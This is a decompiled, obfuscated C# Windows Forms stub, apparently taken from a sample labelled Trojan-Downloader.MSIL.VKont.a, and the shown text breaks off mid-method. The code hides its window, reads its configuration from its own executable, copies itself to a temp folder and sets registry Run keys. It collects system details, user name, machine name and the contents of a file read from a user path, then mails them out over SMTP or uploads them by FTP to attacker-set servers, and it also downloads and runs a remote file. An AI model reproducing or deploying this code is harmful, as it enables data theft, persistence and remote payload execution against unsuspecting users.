// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Stub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 7761CAE9-D290-48D9-A44C-5C95C5289DD6
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Trojan-Downloader.MSIL.VKont.a-1d4cb0f0a33db378f9e4ae1b0f91ee4baabf5f1a669646e1278e016241a1452a.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace \u0003
{
  internal class \u0003 : Form
  {
    [NonSerialized]
    internal static \u0001.\u0001 \u0001;
    private IContainer \u0001;
    private System.Windows.Forms.Timer \u0001;
    private TextBox \u0001;
    private TextBox \u0002;
    private TextBox \u0003;
    private readonly byte[] \u0001;
    private readonly byte[] \u0002;
    private \u0002.\u0004 \u0001;
    private string \u0001;
    private string[] \u0001;
    private string \u0002;
    private string \u0003;
    private string \u0004;
    private string \u0005;
    private string \u0006;
    private string \u0007;
    private string \u0008;
    private string \u000E;
    private string \u000F;
    private string \u0010;
    private string \u0011;
    private string \u0012;
    private string \u0013;
    private string \u0014;
    private string \u0015;
    private string \u0016;
    private string \u0017;
    private string \u0018;
    private string \u0019;
    private string \u001A;
    private string \u001B;
    private string \u001C;
    private string \u001D;
    private string \u001E;
    private string \u001F;
    private string \u007F;
    private string \u0080;
    private string \u0081;
    private string \u0082;
    private string \u0083;
    private string \u0084;
    private string \u0086;
    private string \u0087;
    private string \u0088;
    private string \u0089;
    private string \u008A;
    private string \u008B;
    private string \u008C;
    private string \u008D;
    private string \u008E;
    private string \u008F;
    public static readonly uint \u0001;
    public static readonly uint \u0002;
    public static readonly uint \u0003;
    public static readonly uint \u0004;
    private static string \u0090;
    private static string \u0091;
    private string \u0092;
    private string \u0093;

    public \u0003()
    {
      \u0003.\u0003 obj = this;
      // ISSUE: virtual method pointer
      this.Load += new EventHandler((object) obj, __vmethodptr(obj, \u0002));
      this.\u0001 = new byte[24]
      {
        (byte) 1,
        (byte) 2,
        (byte) 3,
        (byte) 4,
        (byte) 5,
        (byte) 6,
        (byte) 7,
        (byte) 8,
        (byte) 9,
        (byte) 10,
        (byte) 11,
        (byte) 12,
        (byte) 13,
        (byte) 14,
        (byte) 15,
        (byte) 16,
        (byte) 17,
        (byte) 18,
        (byte) 19,
        (byte) 20,
        (byte) 21,
        (byte) 22,
        (byte) 23,
        (byte) 24
      };
      this.\u0002 = new byte[8]
      {
        byte.MaxValue,
        (byte) 70,
        (byte) 60,
        (byte) 50,
        (byte) 40,
        (byte) 30,
        (byte) 20,
        (byte) 10
      };
      this.\u0001 = new \u0002.\u0004(this.\u0001, this.\u0002);
      this.\u0001 = Path.GetTempPath();
      this.\u0092 = \u0003.\u0003.\u0001(1113) + \u0002.\u0002.\u0002().Name + \u0003.\u0003.\u0001(1230);
      this.\u0093 = \u0003.\u0003.\u0001(1444);
      this.\u0002();
    }

    [DebuggerNonUserCode]
    protected override void Dispose([In] bool obj0)
    {
      try
      {
        if (!obj0 || this.\u0001 == null)
          return;
        this.\u0001.Dispose();
      }
      finally
      {
        base.Dispose(obj0);
      }
    }

    private void \u0002()
    {
      this.\u0001 = (IContainer) new System.ComponentModel.Container();
      this.\u0002(new System.Windows.Forms.Timer(this.\u0001));
      this.\u0002(new TextBox());
      this.\u0003(new TextBox());
      this.\u0004(new TextBox());
      this.SuspendLayout();
      TextBox textBox1 = this.\u0002();
      Point point1 = new Point(12, 27);
      Point point2 = point1;
      textBox1.Location = point2;
      this.\u0002().Multiline = true;
      this.\u0002().Name = \u0003.\u0003.\u0001(1509);
      TextBox textBox2 = this.\u0002();
      Size size1 = new Size(70, 16);
      Size size2 = size1;
      textBox2.Size = size2;
      this.\u0002().TabIndex = 0;
      TextBox textBox3 = this.\u0003();
      point1 = new Point(88, 27);
      Point point3 = point1;
      textBox3.Location = point3;
      this.\u0003().Multiline = true;
      this.\u0003().Name = \u0003.\u0003.\u0001(1518);
      TextBox textBox4 = this.\u0003();
      size1 = new Size(16, 16);
      Size size3 = size1;
      textBox4.Size = size3;
      this.\u0003().TabIndex = 1;
      TextBox textBox5 = this.\u0004();
      point1 = new Point(12, 49);
      Point point4 = point1;
      textBox5.Location = point4;
      this.\u0004().Multiline = true;
      this.\u0004().Name = \u0003.\u0003.\u0001(1531);
      TextBox textBox6 = this.\u0004();
      size1 = new Size(70, 16);
      Size size4 = size1;
      textBox6.Size = size4;
      this.\u0004().TabIndex = 2;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      size1 = new Size(29, 15);
      this.ClientSize = size1;
      this.Controls.Add((Control) this.\u0004());
      this.Controls.Add((Control) this.\u0003());
      this.Controls.Add((Control) this.\u0002());
      this.FormBorderStyle = FormBorderStyle.None;
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = \u0003.\u0003.\u0001(1556);
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.Text = \u0003.\u0003.\u0001(1556);
      this.WindowState = FormWindowState.Minimized;
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    [SpecialName]
    internal virtual System.Windows.Forms.Timer \u0002() => this.\u0001;

    [SpecialName]
    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void \u0002([In] System.Windows.Forms.Timer obj0)
    {
      \u0003.\u0003 obj = this;
      // ISSUE: virtual method pointer
      EventHandler eventHandler = new EventHandler((object) obj, __vmethodptr(obj, \u0003));
      if (this.\u0001 != null)
        this.\u0001.Tick -= eventHandler;
      this.\u0001 = obj0;
      if (this.\u0001 == null)
        return;
      this.\u0001.Tick += eventHandler;
    }

    [SpecialName]
    internal virtual TextBox \u0002() => this.\u0001;

    [SpecialName]
    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void \u0002([In] TextBox obj0) => this.\u0001 = obj0;

    [SpecialName]
    internal virtual TextBox \u0003() => this.\u0002;

    [SpecialName]
    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void \u0003([In] TextBox obj0) => this.\u0002 = obj0;

    [SpecialName]
    internal virtual TextBox \u0004() => this.\u0003;

    [SpecialName]
    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void \u0004([In] TextBox obj0) => this.\u0003 = obj0;

    static \u0003()
    {
      \u0001.\u0002.\u0002();
      \u0003.\u0003.\u0001 = 32771U;
      \u0003.\u0003.\u0002 = 26113U;
      \u0003.\u0003.\u0003 = 26114U;
      \u0003.\u0003.\u0004 = 26625U;
      \u0003.\u0003.\u0090 = \u0003.\u0003.\u0001(1565);
      \u0003.\u0003.\u0091 = \u0003.\u0003.\u0001(276);
    }

    private void \u0002([In] object obj0, [In] EventArgs obj1)
    {
      this.Visible = false;
      this.Hide();
      FileSystem.FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared);
      this.\u0002 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0003 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0004 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0005 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0014 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0015 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0007 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0008 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0006 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u000E = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u001B = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u001C = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u001D = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u001E = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u001F = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u007F = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0080 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0081 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0082 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0083 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0084 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0086 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0087 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0088 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0089 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u008A = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0016 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0017 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0019 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u000F = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u001A = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0010 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0018 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0011 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0012 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0013 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u008B = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u008C = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u008D = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u008E = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u008F = Strings.Space(checked ((int) FileSystem.LOF(1)));
      FileSystem.FileGet(1, ref this.\u0002);
      FileSystem.FileGet(1, ref this.\u0003);
      FileSystem.FileGet(1, ref this.\u0004);
      FileSystem.FileGet(1, ref this.\u0005);
      FileSystem.FileGet(1, ref this.\u0014);
      FileSystem.FileGet(1, ref this.\u0015);
      FileSystem.FileGet(1, ref this.\u0007);
      FileSystem.FileGet(1, ref this.\u0008);
      FileSystem.FileGet(1, ref this.\u0006);
      FileSystem.FileGet(1, ref this.\u000E);
      FileSystem.FileGet(1, ref this.\u001B);
      FileSystem.FileGet(1, ref this.\u001C);
      FileSystem.FileGet(1, ref this.\u001D);
      FileSystem.FileGet(1, ref this.\u001E);
      FileSystem.FileGet(1, ref this.\u001F);
      FileSystem.FileGet(1, ref this.\u007F);
      FileSystem.FileGet(1, ref this.\u0080);
      FileSystem.FileGet(1, ref this.\u0081);
      FileSystem.FileGet(1, ref this.\u0082);
      FileSystem.FileGet(1, ref this.\u0083);
      FileSystem.FileGet(1, ref this.\u0084);
      FileSystem.FileGet(1, ref this.\u0086);
      FileSystem.FileGet(1, ref this.\u0087);
      FileSystem.FileGet(1, ref this.\u0088);
      FileSystem.FileGet(1, ref this.\u0089);
      FileSystem.FileGet(1, ref this.\u008A);
      FileSystem.FileGet(1, ref this.\u0016);
      FileSystem.FileGet(1, ref this.\u0017);
      FileSystem.FileGet(1, ref this.\u0019);
      FileSystem.FileGet(1, ref this.\u000F);
      FileSystem.FileGet(1, ref this.\u001A);
      FileSystem.FileGet(1, ref this.\u0010);
      FileSystem.FileGet(1, ref this.\u0018);
      FileSystem.FileGet(1, ref this.\u0011);
      FileSystem.FileGet(1, ref this.\u0012);
      FileSystem.FileGet(1, ref this.\u0013);
      FileSystem.FileGet(1, ref this.\u008B);
      FileSystem.FileGet(1, ref this.\u008C);
      FileSystem.FileGet(1, ref this.\u008D);
      FileSystem.FileGet(1, ref this.\u008E);
      FileSystem.FileGet(1, ref this.\u008F);
      this.\u0001 = Strings.Split(Encoding.Default.GetString(\u0004.\u0002.\u0002(Application.ExecutablePath)), \u0003.\u0003.\u0001(1646));
      if (Conversions.ToBoolean(this.\u0001[39]))
      {
        try
        {
          FileSystem.FileOpen(5, this.\u0001 + this.\u0001[41], OpenMode.Binary, OpenAccess.ReadWrite);
          FileSystem.FilePut(5, this.\u0001[40], -1L, false);
          FileSystem.FileClose(5);
          Process.Start(this.\u0001 + this.\u0001[41]);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Conversions.ToBoolean(this.\u0001[38]))
      {
        string str1 = this.\u0001 + Path.GetFileName(Application.ExecutablePath);
        try
        {
          if (Operators.CompareString(Application.ExecutablePath, this.\u0001 + Path.GetFileName(Application.ExecutablePath), false) != 0)
          {
            if (Operators.CompareString(Application.ExecutablePath, this.\u0001 + Path.GetFileName(Application.ExecutablePath), false) != 0)
              System.IO.File.Delete(this.\u0001 + Path.GetFileName(Application.ExecutablePath));
            string executablePath = Application.ExecutablePath;
            string str2 = this.\u0001 + Path.GetFileName(Application.ExecutablePath);
            if (System.IO.File.Exists(executablePath) && !System.IO.File.Exists(str2))
              System.IO.File.Copy(executablePath, str2);
            \u0002.\u0002.\u0002().Registry.CurrentUser.OpenSubKey(\u0003.\u0003.\u0001(1671), true).SetValue(\u0003.\u0003.\u0001(1728), (object) Application.ExecutablePath);
            Process.Start(this.\u0001 + Path.GetFileName(Application.ExecutablePath));
            ProjectData.EndApp();
          }
          else if (Operators.CompareString(Application.ExecutablePath, this.\u0001 + Path.GetFileName(Application.ExecutablePath), false) == 0)
          {
            Thread.Sleep(5000);
            string str3 = Conversions.ToString(\u0002.\u0002.\u0002().Registry.CurrentUser.OpenSubKey(\u0003.\u0003.\u0001(1671), true).GetValue(\u0003.\u0003.\u0001(1728), (object) Application.ExecutablePath));
            if (Operators.CompareString(Application.ExecutablePath, str3, false) != 0 && System.IO.File.Exists(str3))
              FileSystem.Kill(str3);
          }
          if (Conversions.ToBoolean(this.\u0001[28]))
            \u0002.\u0002.\u0002().Registry.CurrentUser.OpenSubKey(\u0003.\u0003.\u0001(1737), true).SetValue(\u0003.\u0003.\u0001(1798), (object) str1);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      else if (!Conversions.ToBoolean(this.\u0001[38]) & Conversions.ToBoolean(this.\u0001[28]))
      {
        try
        {
          string tempPath = Path.GetTempPath();
          string executablePath = Application.ExecutablePath;
          string str = tempPath + Path.GetFileName(Application.ExecutablePath);
          if (System.IO.File.Exists(executablePath) && !System.IO.File.Exists(str))
            System.IO.File.Copy(executablePath, str);
          \u0002.\u0002.\u0002().Registry.CurrentUser.OpenSubKey(\u0003.\u0003.\u0001(1737), true).SetValue(\u0003.\u0003.\u0001(1798), (object) str);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      else
      {
        int num1 = !Conversions.ToBoolean(this.\u0001[38]) & !Conversions.ToBoolean(this.\u0001[28]) ? 1 : 0;
      }
      if (Conversions.ToBoolean(this.\u0001[33]) && !System.IO.File.Exists(this.\u0001 + \u0003.\u0003.\u0001(1819)))
      {
        if (Operators.CompareString(this.\u0001[36], \u0003.\u0003.\u0001(1828), false) == 0)
        {
          int num2 = (int) Interaction.MsgBox((object) this.\u0001[35], MsgBoxStyle.Critical, (object) this.\u0001[34]);
        }
        else if (Operators.CompareString(this.\u0001[36], \u0003.\u0003.\u0001(1833), false) == 0)
        {
          int num3 = (int) Interaction.MsgBox((object) this.\u0001[35], MsgBoxStyle.Exclamation, (object) this.\u0001[34]);
        }
        else if (Operators.CompareString(this.\u0001[36], \u0003.\u0003.\u0001(1838), false) == 0)
        {
          int num4 = (int) Interaction.MsgBox((object) this.\u0001[35], MsgBoxStyle.Information, (object) this.\u0001[34]);
        }
        else if (Operators.CompareString(this.\u0001[36], \u0003.\u0003.\u0001(1843), false) == 0)
        {
          int num5 = (int) Interaction.MsgBox((object) this.\u0001[35], MsgBoxStyle.YesNo, (object) this.\u0001[34]);
        }
      }
      if (Conversions.ToBoolean(this.\u0001[27]))
        this.\u0002().Start();
      if (Conversions.ToBoolean(this.\u0001[11]))
      {
        try
        {
          \u0003.\u0002.\u0002();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        try
        {
          TextBox textBox = this.\u0002();
          textBox.Text = textBox.Text + this.\u0002().Text + \u0003.\u0003.\u0001(1848) + System.IO.File.ReadAllText(Interaction.Environ(\u0003.\u0003.\u0001(1917)) + \u0003.\u0003.\u0001(729)) + \u0003.\u0003.\u0001(975);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Conversions.ToBoolean(this.\u0001[12]))
      {
        try
        {
          \u0005.\u0002.\u0002();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Conversions.ToBoolean(this.\u0001[13]))
      {
        try
        {
          this.\u0003();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Conversions.ToBoolean(this.\u0001[14]))
      {
        try
        {
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Conversions.ToBoolean(this.\u0001[15]))
      {
        try
        {
          \u0004.\u0004.\u0003();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Conversions.ToBoolean(this.\u0001[16]))
      {
        try
        {
          this.\u0003();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Conversions.ToBoolean(this.\u0001[17]))
      {
        try
        {
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Conversions.ToBoolean(this.\u0001[18]))
      {
        try
        {
          \u0003.\u0001.\u0002();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Conversions.ToBoolean(this.\u0001[19]))
      {
        try
        {
          this.\u0002();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Conversions.ToBoolean(this.\u0001[21]))
      {
        try
        {
          this.\u0004();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Conversions.ToBoolean(this.\u0001[22]))
      {
        try
        {
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Conversions.ToBoolean(this.\u0001[23]))
      {
        try
        {
          this.\u0002();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Conversions.ToBoolean(this.\u0001[24]))
      {
        try
        {
          \u0004.\u0004.\u0002();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Conversions.ToBoolean(this.\u0001[25]))
      {
        try
        {
          this.\u0005();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Conversions.ToBoolean(this.\u0001[26]))
      {
        try
        {
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (!System.IO.File.Exists(this.\u0001 + \u0003.\u0003.\u0001(1819)))
      {
        try
        {
          this.\u0004().Text = \u0003.\u0003.\u0001(1922);
          \u0005.\u0002.\u0003();
          this.\u0004().Text = this.\u0004().Text + \u0003.\u0003.\u0001(2019) + \u0002.\u0002.\u0002().Info.OSFullName + \u0003.\u0003.\u0001(975);
          this.\u0004().Text = this.\u0004().Text + \u0003.\u0003.\u0001(2052) + Environment.UserName.ToString() + \u0003.\u0003.\u0001(975);
          this.\u0004().Text = this.\u0004().Text + \u0003.\u0003.\u0001(2069) + Environment.SystemDirectory.ToString() + \u0003.\u0003.\u0001(975);
          this.\u0004().Text = this.\u0004().Text + \u0003.\u0003.\u0001(2090) + Environment.MachineName.ToString() + \u0003.\u0003.\u0001(975);
          \u0005.\u0002.\u0004();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        string str = \u0003.\u0003.\u0001(2111) + \u0002.\u0002.\u0002().Name;
        if (!Directory.Exists(this.\u0001 + \u0003.\u0003.\u0001(2136)))
        {
          Directory.CreateDirectory(this.\u0001 + \u0003.\u0003.\u0001(2136));
          new DirectoryInfo(this.\u0001 + \u0003.\u0003.\u0001(2136)).Attributes = FileAttributes.Hidden;
        }
        try
        {
          StreamWriter streamWriter = new StreamWriter((Stream) new FileStream(this.\u0001 + \u0003.\u0003.\u0001(2145) + str + \u0003.\u0003.\u0001(2154), FileMode.Create, FileAccess.Write));
          streamWriter.WriteLine(this.\u0092 + this.\u0004().Text + this.\u0093);
          streamWriter.Close();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        if (Conversions.ToBoolean(this.\u0001[5]))
        {
          try
          {
            MailMessage message = new MailMessage();
            message.Subject = \u0003.\u0003.\u0001(2111) + \u0002.\u0002.\u0002().Name;
            message.To.Add(this.\u0001.\u0002(this.\u0001[1]));
            message.From = new MailAddress(this.\u0001.\u0002(this.\u0001[1]));
            message.Body = this.\u0092 + this.\u0004().Text + this.\u0093;
            Attachment attachment = new Attachment(this.\u0001 + \u0003.\u0003.\u0001(2145) + str + \u0003.\u0003.\u0001(2154));
            message.Attachments.Add(attachment);
            SmtpClient smtpClient = new SmtpClient(this.\u0001.\u0002(this.\u0001[3]));
            smtpClient.Port = Conversions.ToInteger(this.\u0001.\u0002(this.\u0001[4]));
            smtpClient.EnableSsl = true;
            message.IsBodyHtml = true;
            smtpClient.Credentials = (ICredentialsByHost) new NetworkCredential(this.\u0001.\u0002(this.\u0001[1]), this.\u0001.\u0002(this.\u0001[2]));
            smtpClient.Send(message);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        if (Conversions.ToBoolean(this.\u0001[6]))
        {
          try
          {
            FtpWebRequest ftpWebRequest = (FtpWebRequest) WebRequest.Create(\u0003.\u0003.\u0001(2163) + this.\u0001.\u0002(this.\u0001[9]) + \u0003.\u0003.\u0001(2172) + this.\u0001.\u0002(this.\u0001[10]) + \u0003.\u0003.\u0001(2172) + str + \u0003.\u0003.\u0001(2154));
            ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(this.\u0001.\u0002(this.\u0001[7]), this.\u0001.\u0002(this.\u0001[8]));
            ftpWebRequest.Method = \u0003.\u0003.\u0001(2177);
            byte[] buffer = System.IO.File.ReadAllBytes(this.\u0001 + \u0003.\u0003.\u0001(2145) + str + \u0003.\u0003.\u0001(2154));
            Stream requestStream = ftpWebRequest.GetRequestStream();
            requestStream.Write(buffer, 0, buffer.Length);
            requestStream.Close();
            requestStream.Dispose();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
      }
      string str4 = \u0003.\u0003.\u0001(2186) + \u0002.\u0002.\u0002().Name;
      string str5 = \u0003.\u0003.\u0001(2207) + \u0002.\u0002.\u0002().Name;
      if (!Directory.Exists(this.\u0001 + \u0003.\u0003.\u0001(2136)))
      {
        Directory.CreateDirectory(this.\u0001 + \u0003.\u0003.\u0001(2136));
        new DirectoryInfo(this.\u0001 + \u0003.\u0003.\u0001(2136)).Attributes = FileAttributes.Hidden;
      }
      try
      {
        StreamWriter streamWriter = new StreamWriter((Stream) new FileStream(this.\u0001 + \u0003.\u0003.\u0001(2145) + str4 + \u0003.\u0003.\u0001(2154), FileMode.Create, FileAccess.Write));
        streamWriter.WriteLine(this.\u0092 + this.\u0002().Text + this.\u0093);
        streamWriter.Close();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        StreamWriter streamWriter = new StreamWriter((Stream) new FileStream(this.\u0001 + \u0003.\u0003.\u0001(2145) + str5 + \u0003.\u0003.\u0001(2228), FileMode.Create, FileAccess.Write));
        streamWriter.WriteLine(this.\u0003().Text);
        streamWriter.Close();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      if (Conversions.ToBoolean(this.\u0001[5]))
      {
        try
        {
          MailMessage message = new MailMessage();
          message.Subject = \u0003.\u0003.\u0001(2186) + \u0002.\u0002.\u0002().Name;
          message.To.Add(this.\u0001.\u0002(this.\u0001[1]));
          message.From = new MailAddress(this.\u0001.\u0002(this.\u0001[1]));
          message.Body = this.\u0092 + this.\u0002().Text + this.\u0093;
          Attachment attachment = new Attachment(this.\u0001 + \u0003.\u0003.\u0001(2145) + str4 + \u0003.\u0003.\u0001(2154));
          message.Attachments.Add(attachment);
          SmtpClient smtpClient = new SmtpClient(this.\u0001.\u0002(this.\u0001[3]));
          smtpClient.Port = Conversions.ToInteger(this.\u0001.\u0002(this.\u0001[4]));
          smtpClient.EnableSsl = true;
          message.IsBodyHtml = true;
          smtpClient.Credentials = (ICredentialsByHost) new NetworkCredential(this.\u0001.\u0002(this.\u0001[1]), this.\u0001.\u0002(this.\u0001[2]));
          smtpClient.Send(message);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        if (Conversions.ToBoolean(this.\u0001[26]))
        {
          try
          {
            MailMessage message = new MailMessage();
            message.Subject = \u0003.\u0003.\u0001(2207) + \u0002.\u0002.\u0002().Name;
            message.To.Add(this.\u0001.\u0002(this.\u0001[1]));
            message.From = new MailAddress(this.\u0001.\u0002(this.\u0001[1]));
            message.Body = this.\u0003().Text;
            Attachment attachment = new Attachment(this.\u0001 + \u0003.\u0003.\u0001(2145) + str5 + \u0003.\u0003.\u0001(2228));
            message.Attachments.Add(attachment);
            new SmtpClient(this.\u0001.\u0002(this.\u0001[3]))
            {
              Port = Conversions.ToInteger(this.\u0001.\u0002(this.\u0001[4])),
              EnableSsl = true,
              Credentials = ((ICredentialsByHost) new NetworkCredential(this.\u0001.\u0002(this.\u0001[1]), this.\u0001.\u0002(this.\u0001[2])))
            }.Send(message);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
      }
      if (Conversions.ToBoolean(this.\u0001[6]))
      {
        try
        {
          FtpWebRequest ftpWebRequest = (FtpWebRequest) WebRequest.Create(\u0003.\u0003.\u0001(2163) + this.\u0001.\u0002(this.\u0001[9]) + \u0003.\u0003.\u0001(2172) + this.\u0001.\u0002(this.\u0001[10]) + \u0003.\u0003.\u0001(2172) + str4 + \u0003.\u0003.\u0001(2154));
          ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(this.\u0001.\u0002(this.\u0001[7]), this.\u0001.\u0002(this.\u0001[8]));
          ftpWebRequest.Method = \u0003.\u0003.\u0001(2177);
          byte[] buffer = System.IO.File.ReadAllBytes(this.\u0001 + \u0003.\u0003.\u0001(2145) + str4 + \u0003.\u0003.\u0001(2154));
          Stream requestStream = ftpWebRequest.GetRequestStream();
          requestStream.Write(buffer, 0, buffer.Length);
          requestStream.Close();
          requestStream.Dispose();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        if (Conversions.ToBoolean(this.\u0001[26]))
        {
          try
          {
            FtpWebRequest ftpWebRequest = (FtpWebRequest) WebRequest.Create(\u0003.\u0003.\u0001(2163) + this.\u0001.\u0002(this.\u0001[9]) + \u0003.\u0003.\u0001(2172) + this.\u0001.\u0002(this.\u0001[10]) + \u0003.\u0003.\u0001(2172) + str5 + \u0003.\u0003.\u0001(2228));
            ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(this.\u0001.\u0002(this.\u0001[7]), this.\u0001.\u0002(this.\u0001[8]));
            ftpWebRequest.Method = \u0003.\u0003.\u0001(2177);
            byte[] buffer = System.IO.File.ReadAllBytes(this.\u0001 + \u0003.\u0003.\u0001(2145) + str5 + \u0003.\u0003.\u0001(2228));
            Stream requestStream = ftpWebRequest.GetRequestStream();
            requestStream.Write(buffer, 0, buffer.Length);
            requestStream.Close();
            requestStream.Dispose();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
      }
      try
      {
        if (Conversions.ToBoolean(this.\u0001[29]))
        {
          if (!System.IO.File.Exists(this.\u0001 + \u0003.\u0003.\u0001(1819)))
          {
            string str6 = Environment.GetFolderPath(Environment.SpecialFolder.Templates) + \u0003.\u0003.\u0001(2237);
            try
            {
              if (System.IO.File.Exists(str6))
              {
                System.IO.File.Delete(str6);
                \u0002.\u0002.\u0002().Network.DownloadFile(this.\u0001[30], str6);
                Process.Start(str6);
              }
              else
              {
                \u0002.\u0002.\u0002().Network.DownloadFile(this.\u0001[30], str6);
                Process.Start(str6);
              }
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.EndApp();
              ProjectData.ClearProjectError();
            }
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      if (Conversions.ToBoolean(this.\u0001[31]))
      {
        if (!System.IO.File.Exists(this.\u0001 + \u0003.\u0003.\u0001(1819)))
